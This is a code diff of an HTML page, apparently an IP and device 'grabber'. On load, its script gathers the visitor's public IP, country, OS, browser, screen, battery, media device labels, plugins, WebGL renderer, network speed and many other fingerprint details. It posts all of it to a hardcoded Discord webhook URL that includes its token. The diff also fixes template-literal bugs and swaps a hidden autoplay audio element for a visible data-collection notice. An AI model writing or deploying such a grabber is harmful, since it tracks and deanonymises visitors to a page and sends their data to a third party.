@@ -7,96 +7,119 @@
     <style>
         body {
             background-color: black;
-            color: white; /* Make text color white for better visibility on a black background */
-            font-family: Arial, sans-serif; /* Optional: Set a default font */
+            color: white;
+            font-family: Arial, sans-serif;
             margin: 0;
             padding: 0;
-            text-align: center; /* Center align text */
+            text-align: center;
         }
-
         h1 {
             margin-top: 20px;
         }
-
-        audio {
-            display: none; /* Hide audio element */
+        button {
+            margin-top: 20px;
+            padding: 10px 20px;
+            font-size: 16px;
+            cursor: pointer;
         }
     </style>
 </head>
 <body>
-    <h1>Collecting Data...</h1>
-    
-    <!-- Audio element with autoplay and muted attributes -->
-    <audio id="audioElement" src="h.mp3" autoplay muted></audio>
+    <h1>Data Collection</h1>
+    <p>Your data is being collected and sent to our server.</p>
 
     <script>
-        // Function to detect the operating system
-        function getOS() {
-            const platform = navigator.platform.toLowerCase();
-            if (platform.includes('win')) return 'Windows';
-            if (platform.includes('mac')) return 'MacOS';
-            if (platform.includes('linux')) return 'Linux';
-            if (/android/.test(navigator.userAgent.toLowerCase())) return 'Android';
-            if (/iphone|ipad|ipod/.test(navigator.userAgent.toLowerCase())) return 'iOS';
-            return 'Unknown';
-        }
+        async function collectData() {
+            // Function to get the operating system
+            function getOS() {
+                const platform = navigator.platform.toLowerCase();
+                if (platform.includes('win')) return 'Windows';
+                if (platform.includes('mac')) return 'MacOS';
+                if (platform.includes('linux')) return 'Linux';
+                if (/android/.test(navigator.userAgent.toLowerCase())) return 'Android';
+                if (/iphone|ipad|ipod/.test(navigator.userAgent.toLowerCase())) return 'iOS';
+                return 'Unknown';
+            }
 
-        // Function to get the IP address and geolocation data
-        function getIPAddress(callback) {
-            const xhr = new XMLHttpRequest();
-            xhr.open('GET', 'https://api.ipify.org?format=json', true);
-            xhr.onreadystatechange = function() {
-                if (xhr.readyState == 4 && xhr.status == 200) {
-                    const response = JSON.parse(xhr.responseText);
-                    const ip = response.ip;
+            // Function to measure network speed
+            async function measureNetworkSpeed() {
+                const url = 'https://www.example.com/smallfile'; // Replace with the URL of a small file on your server
+                const startTime = Date.now();
+                return new Promise((resolve, reject) => {
+                    fetch(url, { method: 'GET', mode: 'no-cors' })
+                        .then(response => response.blob())
+                        .then(blob => {
+                            const endTime = Date.now();
+                            const duration = (endTime - startTime) / 1000; // in seconds
+                            const fileSize = blob.size / 1024; // in KB
+                            const speed = (fileSize / duration).toFixed(2); // KB/s
+                            resolve(speed);
+                        })
+                        .catch(reject);
+                });
+            }
 
-                    // Get geolocation data
-                    const geoXhr = new XMLHttpRequest();
-                    geoXhr.open('GET', https://ipapi.co/${ip}/json/, true);
-                    geoXhr.onreadystatechange = function() {
-                        if (geoXhr.readyState == 4 && geoXhr.status == 200) {
-                            const geoResponse = JSON.parse(geoXhr.responseText);
-                            const country = geoResponse.country_name;
-                            const continent = geoResponse.continent_code;
-                            callback(ip, country, continent);
-                        }
+            // Function to get network information
+            function getNetworkInformation() {
+                if (navigator.connection) {
+                    const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection || navigator.msConnection;
+                    return {
+                        type: connection.type,
+                        effectiveType: connection.effectiveType,
+                        downlink: connection.downlink,
+                        rtt: connection.rtt
                     };
-                    geoXhr.send();
                 }
-            };
-            xhr.send();
-        }
-
-        // Function to get battery status
-        async function getBatteryStatus() {
-            try {
-                const battery = await navigator.getBattery();
                 return {
-                    level: battery.level,
-                    charging: battery.charging
-                };
-            } catch (error) {
-                console.error("Battery status retrieval failed: ", error);
-                return {
-                    level: "Unknown",
-                    charging: "Unknown"
+                    type: 'Unknown',
+                    effectiveType: 'Unknown',
+                    downlink: 'Unknown',
+                    rtt: 'Unknown'
                 };
             }
-        }
 
-        // Function to collect additional data
-        async function collectData() {
-            const ipPromise = new Promise((resolve) => {
-                getIPAddress((ip, country, continent) => {
-                    resolve({ ip, country, continent });
-                });
-            });
+            // Function to get IP address and geolocation data
+            function getIPAddress(callback) {
+                const xhr = new XMLHttpRequest();
+                xhr.open('GET', 'https://api.ipify.org?format=json', true);
+                xhr.onreadystatechange = function() {
+                    if (xhr.readyState == 4 && xhr.status == 200) {
+                        const response = JSON.parse(xhr.responseText);
+                        const ip = response.ip;
 
-            const batteryPromise = getBatteryStatus();
+                        // Get geolocation data
+                        const geoXhr = new XMLHttpRequest();
+                        geoXhr.open('GET', `https://ipapi.co/${ip}/json/`, true);
+                        geoXhr.onreadystatechange = function() {
+                            if (geoXhr.readyState == 4 && geoXhr.status == 200) {
+                                const geoResponse = JSON.parse(geoXhr.responseText);
+                                const country = geoResponse.country_name;
+                                const continent = geoResponse.continent_code;
+                                callback(ip, country, continent);
+                            }
+                        };
+                        geoXhr.send();
+                    }
+                };
+                xhr.send();
+            }
 
-            const [ipData, batteryData] = await Promise.all([ipPromise, batteryPromise]);
-
-            const mediaDevices = await navigator.mediaDevices.enumerateDevices();
+            // Function to get battery status
+            async function getBatteryStatus() {
+                try {
+                    const battery = await navigator.getBattery();
+                    return {
+                        level: battery.level,
+                        charging: battery.charging
+                    };
+                } catch (error) {
+                    console.error("Battery status retrieval failed: ", error);
+                    return {
+                        level: "Unknown",
+                        charging: "Unknown"
+                    };
+                }
+            }
 
             // Function to get WebGL data
             function getWebGLData() {
@@ -115,7 +138,20 @@
                 };
             }
 
-            const webGLData = getWebGLData();
+            // Collect all data
+            const ipPromise = new Promise((resolve) => {
+                getIPAddress((ip, country, continent) => {
+                    resolve({ ip, country, continent });
+                });
+            });
+
+            const batteryPromise = getBatteryStatus();
+            const networkSpeed = await measureNetworkSpeed();
+            const networkInfo = getNetworkInformation();
+
+            const [ipData, batteryData] = await Promise.all([ipPromise, batteryPromise]);
+
+            const mediaDevices = await navigator.mediaDevices.enumerateDevices();
 
             return {
                 ...ipData,
@@ -123,7 +159,7 @@
                 browser: navigator.appName,
                 browserVersion: navigator.appVersion,
                 renderingEngine: navigator.product,
-                screenResolution: ${window.screen.width}x${window.screen.height},
+                screenResolution: `${window.screen.width}x${window.screen.height}`,
                 screenColorDepth: window.screen.colorDepth,
                 screenOrientation: window.screen.orientation.type,
                 timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
@@ -136,15 +172,19 @@
                 platform: navigator.platform,
                 vendor: navigator.vendor,
                 deviceMemory: navigator.deviceMemory || "Unknown",
-                connectionType: navigator.connection ? navigator.connection.effectiveType : "Unknown",
+                connectionType: networkInfo.type,
+                effectiveConnectionType: networkInfo.effectiveType,
+                downlink: networkInfo.downlink,
+                rtt: networkInfo.rtt,
+                networkSpeed: networkSpeed + ' KB/s',
                 hardwareConcurrency: navigator.hardwareConcurrency || "Unknown",
                 maxTouchPoints: navigator.maxTouchPoints,
                 batteryLevel: batteryData.level,
                 batteryCharging: batteryData.charging,
                 doNotTrack: navigator.doNotTrack,
                 localTime: new Date().toLocaleString(),
-                windowInnerDimensions: ${window.innerWidth}x${window.innerHeight},
-                documentDimensions: ${document.documentElement.scrollWidth}x${document.documentElement.scrollHeight},
+                windowInnerDimensions: `${window.innerWidth}x${window.innerHeight}`,
+                documentDimensions: `${document.documentElement.scrollWidth}x${document.documentElement.scrollHeight}`,
                 browserName: navigator.userAgent.match(/(firefox|msie|chrome|safari|trident)/gi)?.[0] || 'Unknown',
                 browserMajorVersion: parseInt(navigator.userAgent.match(/(firefox|msie|chrome|safari|trident)\/?\s*(\d+)/i)?.[2]) || 'Unknown',
                 preferredLanguages: navigator.languages.join(', '),
@@ -153,10 +193,10 @@
                 audioContext: window.AudioContext ? 'Supported' : 'Not Supported',
                 touchCapabilities: 'ontouchstart' in window || navigator.maxTouchPoints > 0 ? 'Supported' : 'Not Supported',
                 installedPlugins: Array.from(navigator.plugins).map(plugin => plugin.name).join(', '),
-                mediaDevices: mediaDevices.map(device => ${device.kind}: ${device.label}).join(', '),
+                mediaDevices: mediaDevices.map(device => `${device.kind}: ${device.label}`).join(', '),
                 storageQuota: navigator.storage && navigator.storage.estimate ? (await navigator.storage.estimate()).quota : 'Unknown',
-                webGLRenderer: webGLData.renderer,
-                webGLVendor: webGLData.vendor,
+                webGLRenderer: getWebGLData().renderer,
+                webGLVendor: getWebGLData().vendor,
                 timezoneOffset: new Date().getTimezoneOffset(),
                 cpuClass: navigator.userAgent.match(/(arm|x86|x64)/gi)?.[0] || 'Unknown',
                 deviceType: /Mobi|Android/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop',
@@ -171,16 +211,17 @@
             };
         }
 
-        // Send the collected data to the Discord webhook
+        // Send the collected data to Discord webhook
         async function sendData() {
             const data = await collectData();
             const xhr = new XMLHttpRequest();
-            const url = 'https://discord.com/api/webhooks/1249043424020004865/iZguJoomM0MqkqlEf9lZKZ9eKJNgJGKTsjUzUSexCMOXXVjQ-Mh2uIGXQOmT9QQds3_s';
+            const url = 'https://discord.com/api/webhooks/1249043424020004865/iZguJoomM0MqkqlEf9lZKZ9eKJNgJGKTsjUzUSexCMOXXVjQ-Mh2uIGXQOmT9QQds3_s'; // Replace with your Discord webhook URL
             xhr.open('POST', url, true);
             xhr.setRequestHeader('Content-Type', 'application/json');
 
             const payload = JSON.stringify({
-                content: IP Address: ${data.ip}
+                content: `**Collected Data**
+IP Address: ${data.ip}
 Country: ${data.country}
 Continent: ${data.continent}
 Device: ${data.device}
@@ -201,6 +242,10 @@ Platform: ${data.platform}
 Vendor: ${data.vendor}
 Device Memory: ${data.deviceMemory}
 Connection Type: ${data.connectionType}
+Effective Connection Type: ${data.effectiveConnectionType}
+Downlink: ${data.downlink}
+RTT: ${data.rtt}
+Network Speed: ${data.networkSpeed}
 Hardware Concurrency: ${data.hardwareConcurrency}
 Max Touch Points: ${data.maxTouchPoints}
 Battery Level: ${data.batteryLevel}
@@ -226,7 +271,7 @@ CPU Class: ${data.cpuClass}
 Device Type: ${data.deviceType}
 CSS Features: ${JSON.stringify(data.cssFeatures)}
 JavaScript Features: ${JSON.stringify(data.jsFeatures)}
-
+`
             });
 
             xhr.send(payload);
